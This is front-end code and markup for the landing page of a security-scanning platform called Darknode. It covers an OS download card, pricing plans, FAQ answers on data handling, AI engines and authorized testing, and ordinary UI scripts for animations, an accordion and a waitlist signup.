            <p class="os-card-desc">Full desktop environment built on Ubuntu 24.04 LTS. Pre-loaded with the entire Darknode toolkit, Nexus AI agent, and every security tool configured and ready to go.</p>
            <ul class="os-features">
              <li>Ubuntu 24.04 LTS with XFCE desktop</li>
              <li>Darknode CLI + Nexus pre-installed</li>
              <li>nmap, sqlmap, nuclei, ffuf, httpx, Burp Suite</li>
              <li>The full security toolset ready to run</li>
              <li>Custom wallpapers, icons, and theming</li>
              <li>Cloud-init auto-provisioning on first boot</li>
            </ul>
            <div class="os-card-meta">370 MB download &middot; Self-provisions on first boot</div>
            <a href="https://github.com/Darknode-Official/darknode-os/releases/download/v1.0.0/darknode-os-ubuntu-slim.qcow2.xz" class="btn lg os-dl" target="_blank" rel="noopener">Download qcow2</a>
          </div>
        </div>
        <div class="os-boot-preview">
          <div class="term-window">
            <div class="term-bar"><span class="term-dot"></span><span class="term-dot"></span><span class="term-dot"></span><span class="term-title">darknode-os</span></div>
            <pre class="term-body">
  ____             _                     _        ___  ____
 |  _ \\  __ _ _ __| | ___ __   ___   __| | ___  / _ \\/ ___|
 | | | |/ _\` | '__| |/ / '_ \\ / _ \\ / _\` |/ _ \\| | | \\___ \\
 | |_| | (_| | |  |   &lt;| | | | (_) | (_| |  __/| |_| |___) |
 |____/ \\__,_|_|  |_|\\_\\_| |_|\\___/ \\__,_|\\___| \\___/|____/

 Darknode OS v0.1.0 — Custom x86 Kernel
 Memory: 128 MB | Timer: 1000 Hz | Disk: ATA PIO
 Network: NE2000 NIC | Stack: IPv4/ICMP/UDP/DHCP/DNS
 Filesystems: ramfs, devfs mounted

 nexus&gt; help
 Available commands (28):
   help ls cat mkdir touch write rm cd pwd ps mount
   disk free mem cpuinfo time uptime echo version
   clear reboot shutdown ifconfig ping arp dhcp dns netstat

 nexus&gt; _</pre>
          </div>
        </div>
      </div>
    </section>

    <!-- ====== PRICING ====== -->
    <section class="section alt" id="pricing" aria-labelledby="pricing-title">
      <div class="wrap">
        <div class="sec-label">Pricing</div>
        <h2 class="sec-title" id="pricing-title">Free to start. Upgrade when you're ready.</h2>
        <p class="sec-sub">Bring your own AI key on any plan. Paid plans unlock platform features, not AI access.</p>
        <div class="pricing-grid" id="pricing-grid">
          <div class="price-card">
            <div class="price-tier">Free</div>
            <div class="price-amount">$0<span class="price-period">/forever</span></div>
            <p class="price-desc">The full browser toolbox for solo practitioners and evaluation.</p>
            <ul class="price-features">
              <li>Every browser-based security tool</li>
              <li>Personal space: domain, link, secret and data checks</li>
              <li>Local-only security graph &amp; cases</li>
              <li>Darknode AI assistant</li>
              <li>1 workspace, 1 seat</li>
            </ul>
            <button class="btn lg" id="price-free">Get started free</button>
          </div>
          <div class="price-card featured">
            <div class="price-badge">Recommended</div>
            <div class="price-tier">Pro</div>
            <div class="price-amount">$29<span class="price-period">/user/month</span></div>
            <p class="price-desc">Built for working security professionals.</p>
            <ul class="price-features compact">
              <li>Everything in Free, plus:</li>
              <li>Exposure and Application Security tools, findings and reports</li>
              <li>Unlimited saved findings &amp; reports</li>
              <li>Premium AI models: Claude Fable 5.1, Claude Opus 5.5, Darknode Max</li>
              <li>Cloud sync across devices</li>
              <li>Email support</li>
            </ul>
            <button class="btn lg ghost" id="price-pro">Join waitlist</button>
          </div>
          <div class="price-card">
            <div class="price-tier">Team</div>
            <div class="price-amount">$79<span class="price-period">/user/month</span></div>
            <p class="price-desc">Shared findings and workflow for a security team.</p>
            <ul class="price-features compact">
              <li>Everything in Pro, plus:</li>
              <li>Organization space, Identity, Security Operations, Fraud &amp; Abuse</li>
              <li>Shared team workspaces &amp; roles</li>
              <li>Integrations (ticketing, chat webhooks)</li>
              <li>Activity &amp; audit log</li>
            </ul>
            <button class="btn lg ghost" id="price-team">Join waitlist</button>
          </div>
          <div class="price-card">
            <div class="price-tier">Enterprise</div>
            <div class="price-amount">Custom</div>
            <p class="price-desc">Control, compliance, and scale for organizations.</p>
            <ul class="price-features compact">
              <li>Everything in Team, plus:</li>
              <li>Risk &amp; Resilience and Compliance tools</li>
              <li>Private deployment</li>
              <li>SSO &amp; MFA (on the roadmap), custom roles</li>
              <li>Compliance pack &amp; DPA</li>
              <li>Dedicated support</li>
            </ul>
            <button class="btn lg ghost" id="price-enterprise">Contact sales</button>
          </div>
        </div>
        <p class="pricing-note">Paid plans are in preview: checkout is not live yet, so upgrades are requested and granted by hand and no payment is taken. You never pay Darknode for AI tokens &mdash; bring your own key or run Ollama locally.</p>
      </div>
    </section>

    <!-- ====== FAQ ====== -->
    <section class="section" id="faq" aria-labelledby="faq-title">
      <div class="wrap">
        <div class="sec-label">FAQ</div>
        <h2 class="sec-title" id="faq-title">Frequently asked questions</h2>
        <div class="faq-list">

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">Can I run Darknode offline or air-gapped?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">Yes. The Free plan includes every browser-based security tool, the Personal space checks, a local security graph and the Darknode AI assistant, with no time limit. The CLI is free to run from source. Pro, Team and Enterprise add the premium AI models (Claude Fable 5.1, Claude Opus 5.5, Darknode Max), the Exposure, Application Security, Organization and Compliance tool sets, shared workspaces and cloud sync; they are in preview and granted on request while checkout is not live.</div>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">Does our code or data ever leave our environment?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">Your scans and saved findings stay with you. The CLI, desktop app and Darknode OS run on your own machines and can run fully air-gapped. On darknode.ai, most analysis runs inside your browser; live checks against a domain (DNS, headers, certificate transparency) are fetched through our edge proxy and are not stored. The built-in web assistant sends your question through that same proxy to Google&rsquo;s Gemini model; we do not log or store prompts or answers. With Nexus you choose the engine: a local Ollama model keeps everything offline, and with a cloud engine your prompts go to that provider under its terms.</div>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">What AI models does Darknode support?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">Nexus drives 6 AI engines through one interface: Claude Code (Anthropic), the Gemini CLI (Google), Codex (OpenAI), OpenCode, Aider, and Ollama for free local models &mdash; any Ollama-compatible model including Llama 3, Mixtral, CodeLlama, Phi-3, and Qwen. Nexus can switch engines mid-conversation, race multiple models against each other, or ensemble their answers for higher accuracy. You can also point the local engine at any OpenAI-compatible endpoint (OpenRouter, Groq, DeepSeek, Together, Mistral, and others). You bring your own API key &mdash; Darknode never charges for AI tokens on any plan.</div>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">Is this legal to use?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">Yes. Darknode is built for assessing systems you own or are authorized to assess &mdash; your own code, cloud accounts, dependencies, and infrastructure. Any practice labs and vulnerable environments run locally in Docker containers on your own machine. The underlying tools are the same ones used by professional security teams worldwide (nmap, nuclei, Burp Suite, etc.). Always ensure you have authorization for the systems you scan; unauthorized testing of systems you don't own is illegal regardless of the tools used.</div>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">How is this different from a standalone scanner?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">Most tools cover one surface &mdash; code, or dependencies, or cloud. Darknode brings code, cloud, dependencies, secrets, configs, and threat intelligence into one command center, links every finding to the exact file and line, ranks it by real severity with deterministic engines, and then lets the optional Nexus assistant explain it and draft remediation. It runs entirely on your own infrastructure, exposes a REST API and CLI for your pipelines, and exports audit-ready reports &mdash; so one platform covers scanning, triage, compliance, and reporting instead of five.</div>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">Can I use this for professional security assessments?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">Yes, within scope. Darknode covers the assessment workflow: scanning code, dependencies, cloud configuration and web exposure; triaging findings by real severity; and building a report you can hand over. The hands-on web-security tools (security headers, CSP, CORS, cookies, API and WebSocket testing) work against targets you name. Always operate within your engagement scope and rules of engagement, and keep written authorization for every system you test.</div>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">What are the system requirements?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">For the web platform (darknode.ai): any modern browser (Chrome, Firefox, Safari, Edge). For the CLI: Node.js 18+ on Windows, macOS, or Linux. For local AI models via Ollama: 16 GB RAM minimum (32 GB recommended for larger models). For practice labs: Docker installed and running. For Darknode OS (Custom Kernel): VirtualBox or QEMU with 128 MB RAM. For Darknode OS (Linux Edition): VirtualBox or VMware with 4 GB RAM and 40 GB disk space. The desktop app is available as .AppImage (Linux), .dmg (macOS), and .exe (Windows).</div>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">How do paid plans work?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">The core platform, the CLI, desktop and OS editions stay free. Paid Pro, Team and Enterprise plans (coming soon) add more of the platform: Pro adds exposure, application-security and reporting tools; Team adds the shared Organization space, identity and security-operations tools and team workspaces; Enterprise adds risk and compliance tooling. Tools are shown according to your plan, so you only see what your plan includes.</div>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">Can I contribute or modify the code?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">The Darknode source code is publicly available on GitHub for transparency and learning purposes. You can read, study, and reference the code to understand how the platform works. However, copying, forking, redistribution, and commercial use are not permitted under the license. If you find a bug or have a feature request, please open an issue on GitHub &mdash; we actively review and respond to community feedback.</div>
            </div>
          </div>

          <div class="faq-item">
            <button class="faq-q" aria-expanded="false">
              <span class="faq-q-text">Where can I get help?</span>
              <span class="faq-toggle" aria-hidden="true">+</span>
            </button>
            <div class="faq-a" hidden>
              <div class="faq-a-inner">Start with the docs on this site (Docs in the top menu), or run <code>/docs</code> inside Nexus to search every command and key. For bug reports and feature requests, open an issue on our GitHub repository. For account issues, use the in-app feedback form or email contact@darknode.ai.</div>
            </div>
          </div>

        </div>
      </div>
    </section>

    <!-- ====== GOVERNMENT & ENTERPRISE ====== -->
    <section class="section gov-section" id="government" aria-labelledby="gov-title">
      <div class="wrap">
        <div class="sec-label">Government &amp; Enterprise</div>
        <h2 class="sec-title" id="gov-title">Built for government and regulated industries</h2>
        <p class="sec-sub">Tools designed for SOC analysts, CISOs, and GRC teams. From executive briefings to NIST, FedRAMP, and HIPAA compliance mapping.</p>
        <div class="gov-grid">
          <div class="gov-card">
            <div class="gov-icon">[B]</div>
            <h3>Executive Cyber Briefing</h3>
            <p>Generate PDB-style intelligence reports with BLUF summaries, threat actor tracking, sector risk matrices, and classification banners.</p>
          </div>
          <div class="gov-card">
            <div class="gov-icon">[V]</div>
            <h3>Vulnerability Triage Engine</h3>
            <p>SSVC decision trees, CISA KEV integration, BOD 22-01 compliance tracking, and remediation SLA calculators for federal systems.</p>
          </div>
          <div class="gov-card">
            <div class="gov-icon">[$]</div>
            <h3>Incident Cost Calculator</h3>
            <p>Planning estimates from IBM Cost of a Data Breach figures, with sector multipliers, regulatory fine estimation, and insurance gap analysis.</p>
          </div>
          <div class="gov-card">
            <div class="gov-icon">[C]</div>
            <h3>Federal Compliance Mapper</h3>
            <p>Cross-walk NIST 800-53, CSF 2.0, FedRAMP, CMMC 2.0, FISMA, and HIPAA. Gap analysis with POA&amp;M generation and ATO checklists.</p>
          </div>
          <div class="gov-card">
            <div class="gov-icon">[A]</div>
            <h3>Adversary Playbook Builder</h3>
            <p>MITRE ATT&amp;CK emulation planning with detection coverage heatmaps, purple team exercise generation, and STIX 2.1 export.</p>
          </div>
        </div>
      </div>
    </section>

    <!-- ====== CTA ====== -->
    <section class="cta-final">
      <div class="cta-mesh"></div>
      <div class="cta-grid-bg"></div>
      <div class="wrap cta-inner">
        <h2>Find your real risks today.</h2>
        <p class="cta-sub">Your code and findings stay on infrastructure you control.</p>
        <button class="btn lg" id="cta-signup">Get started &rarr;</button>
        <div class="cta-divider"></div>
        <div class="cta-notify">
          <h3 class="cta-notify-h">Get notified when Pro launches</h3>
          <form class="cta-form" id="cta-notify-form" autocomplete="off">
            <input type="email" class="cta-email" id="cta-email" placeholder="test@darknode.ai" required aria-label="Email address">
            <button type="submit" class="btn lg" id="cta-notify-btn">Notify me</button>
          </form>
          <p class="cta-reassure" id="cta-reassure">No spam. One email when we launch.</p>
        </div>
      </div>
    </section>

    <!-- Footer -->
    <footer class="land-footer">
      <div class="wrap land-footer-inner">
        <div class="land-footer-left">
          <span class="land-footer-brand">Darknode</span>
          <p style="font-size:.72rem;color:inherit;opacity:.5;margin:0 0 4px">Security and data-integrity platform for companies &mdash; scan your code, cloud, dependencies, and records. For authorized use on systems you own or are permitted to assess.</p>
          <span class="land-footer-copy">&copy; 2026 Darknode. All rights reserved.</span>
        </div>
        <div class="land-footer-links">
          <a href="${GITHUB}" target="_blank" rel="noopener">GitHub</a>
          <a href="${GITHUB}/darknode-cli" target="_blank" rel="noopener">CLI</a>
          <a href="${GITHUB}/darknode-os" target="_blank" rel="noopener">OS</a>
          <a href="${GITHUB}/nexus" target="_blank" rel="noopener">Nexus</a>
          <a href="/faq" data-nav="section" data-section="faq">FAQ</a>
        </div>
      </div>
    </footer>
`;

  const $ = (id) => view.querySelector("#" + id);
  $("cta-start").onclick = actions.onGetStarted;
  $("cta-signup").onclick = actions.onGetStarted;
  if ($("price-free")) $("price-free").onclick = actions.onGetStarted;

  // Desktop-app download button — label it for the visitor's OS and, on click,
  // resolve the matching installer from the latest release (fallback: releases page).
  const appDl = APP_DL_LIVE && $("app-dl");
  if (appDl) {
    const os = appDetectOS();
    appDl.textContent = "Download for " + (APP_OS_LABEL[os] || "your OS");
    appDl.addEventListener("click", async (e) => {
      e.preventDefault();
      const prev = appDl.textContent;
      appDl.textContent = "Finding latest build...";
      appDl.style.pointerEvents = "none";
      const url = await appResolveAsset(os);
      appDl.textContent = prev;
      appDl.style.pointerEvents = "";
      if (url) window.location.href = url;
      else window.open(APP_RELEASES, "_blank", "noopener");
    });
  }

  const scrollToCta = () => { const el = view.querySelector(".cta-notify"); if (el) el.scrollIntoView({ behavior: "smooth", block: "center" }); };
  if ($("price-pro")) $("price-pro").onclick = scrollToCta;
  if ($("price-team")) $("price-team").onclick = scrollToCta;
  if ($("price-enterprise")) $("price-enterprise").onclick = scrollToCta;

  // Animated counter for hero stats — scroll-triggered with easing
  const counterEls = view.querySelectorAll("[data-count]");
  function formatNum(n, fmt) { return fmt === "comma" ? n.toLocaleString("en-US") : String(n); }
  function animateCounter(el) {
    if (el._counted) return;
    el._counted = true;
    const target = parseInt(el.dataset.count);
    const suffix = el.dataset.suffix || "";
    const fmt = el.dataset.format || "";
    const duration = 1500;
    const start = performance.now();
    function tick(now) {
      const t = Math.min((now - start) / duration, 1);
      const ease = 1 - (1 - t) * (1 - t); // easeOutQuad
      const current = Math.round(ease * target);
      el.textContent = formatNum(current, fmt) + suffix;
      if (t < 1) requestAnimationFrame(tick);
    }
    requestAnimationFrame(tick);
  }
  if ("IntersectionObserver" in window) {
    const trustWrap = view.querySelector('.hero-trust');
    if (trustWrap) {
      const trustIO = new IntersectionObserver((entries) => {
        entries.forEach(e => { if (e.isIntersecting) { counterEls.forEach(el => animateCounter(el)); trustIO.disconnect(); } });
      }, { threshold: 0.1 });
      trustIO.observe(trustWrap);
    } else {
      counterEls.forEach(el => animateCounter(el));
    }
  } else {
    counterEls.forEach(el => animateCounter(el));
  }

  // Hero text rotation
  const words = ["code", "cloud", "dependencies", "configs", "records"];
  let wordIdx = 0;
  const rotateEl = $("hero-rotate");
  if (rotateEl) {
    const wrap = rotateEl.parentElement;
    if (wrap) {
      let maxW = 0;
      const orig = rotateEl.textContent;
      for (const w of words) { rotateEl.textContent = w; maxW = Math.max(maxW, rotateEl.scrollWidth); } // scrollWidth: the word box spans the wrap (0 wide until sized)
      rotateEl.textContent = orig;
      wrap.style.minWidth = maxW + "px";
    }
    setInterval(() => {
      wordIdx = (wordIdx + 1) % words.length;
      rotateEl.style.opacity = "0";
      rotateEl.style.transform = "translateY(-8px)";
      setTimeout(() => {
        rotateEl.style.transition = "none";
        rotateEl.style.transform = "translateY(8px)";
        rotateEl.textContent = words[wordIdx];
        requestAnimationFrame(() => {
          rotateEl.style.transition = "opacity .25s,transform .25s";
          rotateEl.style.opacity = "1";
          rotateEl.style.transform = "translateY(0)";
        });
      }, 250);
    }, 3000);
  }

  // Scroll reveal -- staggered section-level reveal for premium cascading feel.
  // When a section scrolls into view, all its reveal-target children fade in
  // with incremental delays (each child +0.07s after the previous, capped at 0.42s).
  if ("IntersectionObserver" in window) {
    let reduce = false; try { reduce = matchMedia("(prefers-reduced-motion:reduce)").matches; } catch (_) {}
    const REVEAL_SEL = ".sec-label,.sec-title,.sec-sub,.bento-card,.price-card,.feature-row,.tlv-step,.nx-card,.gh-card,.pricing-note,.nx-details,.hero-trust,.hero-built-with,.faq-item,.cmp-landing,.ts-card,.ts-tabs,.nx-arch-layer,.nx-hl,.nx-arch,.metric-card,.rag-tabs,.rag-card,.showcase-tabs,.showcase-window,.showcase-hint,.plab-card,.plab-note,.os-card,.os-boot-preview";
    if (!reduce) {
      const sectionIO = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
          if (!entry.isIntersecting) return;
          sectionIO.unobserve(entry.target);
          const children = entry.target.querySelectorAll(REVEAL_SEL);
          children.forEach((child, i) => {
            child.style.transitionDelay = Math.min(i * 0.07, 0.42) + "s";
          });
          // rAF ensures transition-delay is applied before class triggers transition
          requestAnimationFrame(() => {
            children.forEach(child => child.classList.add("revealed"));
            // cta-final itself is a reveal target (no children in REVEAL_SEL)
            if (entry.target.matches(".cta-final")) {
              entry.target.classList.add("revealed");
            }
          });
        });
      }, { threshold: 0.08, rootMargin: "0px 0px -40px 0px" });
      view.querySelectorAll(".section, .hero, .cta-final").forEach(sec => sectionIO.observe(sec));
      // Fallback: reveal anything already visible, and reveal all after 3s max
      setTimeout(() => { const wh = window.innerHeight + 200; const els = [...view.querySelectorAll(REVEAL_SEL)]; const tops = els.map(el => el.getBoundingClientRect().top); els.forEach((el, i) => { if (tops[i] < wh) el.classList.add("revealed"); }); }, 300);
      setTimeout(() => { view.querySelectorAll(REVEAL_SEL).forEach(el => el.classList.add("revealed")); }, 3000);
    } else {
      // Reduced motion: make everything visible immediately, no transitions
      view.querySelectorAll(REVEAL_SEL + ",.cta-final").forEach(el => el.classList.add("revealed"));
    }
  }

  // Top scroll-progress bar (body.landing::before reads --scrollp) + parallax on
  // .section.alt backgrounds. Both are driven from one rAF-throttled scroll handler.
  (function() {
    let reduce = false; try { reduce = matchMedia("(prefers-reduced-motion:reduce)").matches; } catch (_) {}
    const altSections = reduce ? [] : view.querySelectorAll(".section.alt");
    const bodyStyle = document.body.style;
    let ticking = false;
    function updateScrollUi() {
      // Scroll progress: fraction of the document scrolled. Recomputing scrollHeight
      // every frame keeps the value correct when the page grows mid-scroll (images,
      // reveals); the CSS transition smooths the resulting adjustment so it never
      // visibly jumps backward.
      const el = document.scrollingElement || document.documentElement;
      const max = el.scrollHeight - el.clientHeight;
      const p = max > 0 ? Math.min(1, Math.max(0, el.scrollTop / max)) : 0;
      bodyStyle.setProperty("--scrollp", p.toFixed(4));
      if (altSections.length) {
        const vh = window.innerHeight;
        altSections.forEach(function(sec) {
          const rect = sec.getBoundingClientRect();
          const progress = (vh - rect.top) / (vh + rect.height);
          const clamped = Math.max(0, Math.min(1, progress));
          sec.style.setProperty("--px-x", ((clamped - 0.5) * 80) + "px");
          sec.style.setProperty("--px-y", ((clamped - 0.5) * 60) + "px");
        });
      }
      ticking = false;
    }
    function onScroll() { if (!ticking) { ticking = true; requestAnimationFrame(updateScrollUi); } }
    window.addEventListener("scroll", onScroll, { passive: true });
    window.addEventListener("resize", onScroll, { passive: true });
    updateScrollUi();
  })();

  // Smooth scroll for anchor links within the landing page
  view.querySelectorAll('a[href^="#"]').forEach(link => {
    link.addEventListener("click", (e) => {
      const href = link.getAttribute("href");
      if (!href || href === "#") return;
      const target = view.querySelector(href);
      if (target) {
        e.preventDefault();
        target.scrollIntoView({ behavior: "smooth", block: "start" });
      }
    });
  });

  // Keyboard accessibility: make pricing cards focusable
  view.querySelectorAll(".bento-card, .nx-card, .gh-card").forEach(el => {
    if (!el.getAttribute("tabindex") && !el.closest("a")) {
      el.setAttribute("tabindex", "0");
    }
  });

  // FAQ accordion
  view.querySelectorAll(".faq-q").forEach(btn => {
    btn.addEventListener("click", () => {
      const item = btn.closest(".faq-item");
      const panel = item.querySelector(".faq-a");
      const toggle = btn.querySelector(".faq-toggle");
      const isOpen = item.classList.contains("open");

      if (isOpen) {
        // Collapse: animate from current height to 0
        panel.style.maxHeight = panel.scrollHeight + "px";
        requestAnimationFrame(() => {
          panel.style.maxHeight = "0";
        });
        item.classList.remove("open");
        btn.setAttribute("aria-expanded", "false");
        toggle.textContent = "+";
        panel.addEventListener("transitionend", function handler() {
          panel.hidden = true;
          panel.removeEventListener("transitionend", handler);
        });
      } else {
        // Expand: reveal then animate from 0 to scrollHeight
        panel.hidden = false;
        panel.style.maxHeight = "0";
        requestAnimationFrame(() => {
          panel.style.maxHeight = panel.scrollHeight + "px";
        });
        item.classList.add("open");
        btn.setAttribute("aria-expanded", "true");
        toggle.textContent = "−";
        panel.addEventListener("transitionend", function handler() {
          panel.style.maxHeight = "none";
          panel.removeEventListener("transitionend", handler);
        });
      }
    });
  });

  // Security Knowledge RAG tabs
  const ragTabs = view.querySelectorAll(".rag-tab");
  const ragPanels = view.querySelectorAll(".rag-panel");
  ragTabs.forEach(tab => {
    tab.addEventListener("click", () => {
      const target = tab.dataset.rag;
      ragTabs.forEach(t => {
        const active = t.dataset.rag === target;
        t.classList.toggle("active", active);
        t.setAttribute("aria-selected", active ? "true" : "false");
      });
      ragPanels.forEach(p => {
        const active = p.dataset.ragPanel === target;
        p.classList.toggle("active", active);
        if (active) {
          // Re-trigger reveal on newly visible cards
          p.querySelectorAll(".rag-card").forEach(c => c.classList.add("revealed"));
        }
      });
    });
    // Keyboard navigation for RAG tabs (left/right arrows)
    tab.addEventListener("keydown", (e) => {
      const tabList = Array.from(ragTabs);
      const idx = tabList.indexOf(tab);
      let next = -1;
      if (e.key === "ArrowRight") next = (idx + 1) % tabList.length;
      else if (e.key === "ArrowLeft") next = (idx - 1 + tabList.length) % tabList.length;
      if (next >= 0) {
        e.preventDefault();
        tabList[next].focus();
        tabList[next].click();
      }
    });
  });

  // Newsletter signup — store email in Firestore "waitlist" collection
  const notifyForm = $("cta-notify-form");
  const notifyEmail = $("cta-email");
  const notifyBtn = $("cta-notify-btn");
  const notifyMsg = $("cta-reassure");
  if (notifyForm) {
    notifyForm.addEventListener("submit", async (e) => {
      e.preventDefault();
      const email = (notifyEmail.value || "").trim().toLowerCase();
      if (!email) return;
      notifyBtn.disabled = true;
      notifyBtn.textContent = "Sending...";
      try {
        await addDoc(collection(db, "waitlist"), {
          email,
          source: "landing-cta",
          createdAt: serverTimestamp()
        });
        notifyMsg.textContent = "You are on the list. We will email you when Pro launches.";
        notifyMsg.classList.remove("cta-reassure-err");
        notifyMsg.classList.add("cta-reassure-ok");
        notifyEmail.value = "";
        notifyBtn.textContent = "Done";
      } catch (err) {
        notifyMsg.textContent = "Something went wrong. Please try again.";
        notifyMsg.classList.remove("cta-reassure-ok");
        notifyMsg.classList.add("cta-reassure-err");
        notifyBtn.disabled = false;
        notifyBtn.textContent = "Notify me";
      }
    });
  }

  // Handle footer and in-page section links
  view.querySelectorAll("a[data-nav='section']").forEach(link => {
    link.addEventListener("click", (e) => {
      e.preventDefault();
      window.location.href = link.getAttribute("href");
    });
  });

  // Dedicated page routing — show only the target section at /faq, /pricing, etc.
  const PAGE_ROUTES = { "/pricing": "pricing", "/faq": "faq", "/features": "features", "/darknode-os": "darknode-os" };
  const PAGE_TITLES = { "/pricing": "Pricing", "/faq": "FAQ", "/features": "Features", "/darknode-os": "Darknode OS" };
  const dedicatedId = PAGE_ROUTES[location.pathname];
  if (dedicatedId) {
    view.querySelectorAll(".section, .hero, .cta-final").forEach(sec => {
      if (sec.id !== dedicatedId) sec.hidden = true;
    });
    const target = view.querySelector("#" + dedicatedId);
    if (target) {
      const back = document.createElement("div");
      back.className = "dedicated-page-header";
      back.innerHTML = '<a class="dedicated-back" href="/"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg> Back to home</a>';
      back.querySelector("a").addEventListener("click", (e) => { e.preventDefault(); window.location.href = "/"; });
      target.insertAdjacentElement("beforebegin", back);
    }
    document.title = (PAGE_TITLES[location.pathname] || "Darknode") + " — Darknode";
    window.scrollTo(0, 0);
  }

  // Public tool pages: published open data that needs no account. The sitemap and the app
  // manifest link these, so a signed-out visitor must get the tool, not the home page.
  const PUBLIC_TOOLS = { "/crosswalk": { title: "GenAI Security Crosswalk", load: () => import("/js/crosswalk.js?v=20261029c").then((m) => m.renderCrosswalk) } };
  const pub = PUBLIC_TOOLS[location.pathname];
  if (pub) {
    view.querySelectorAll(".section, .hero, .cta-final").forEach((sec) => { sec.hidden = true; });
    const page = document.createElement("section");
    page.className = "section dn-pubtool";
    page.innerHTML = '<div class="wrap"><div class="dedicated-page-header dn-pubbar"><a class="dedicated-back" href="/"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg> Back to home</a><span class="dn-pubnote">Free to use, no account needed.</span><button class="btn sm" type="button">Sign in for the full platform</button></div><div class="dn-pubmain"></div></div>';
    page.querySelector(".dedicated-back").addEventListener("click", (e) => { e.preventDefault(); window.location.href = "/"; });
    page.querySelector(".dn-pubbar .btn").addEventListener("click", () => actions && actions.onSignIn && actions.onSignIn());
    view.prepend(page);
    const mount = page.querySelector(".dn-pubmain");
    pub.load().then((render) => render(mount)).catch(() => { mount.textContent = "Couldn't load this tool. Check your connection and reload."; });
    document.title = pub.title + " — Darknode";
    window.scrollTo(0, 0);
  }
}
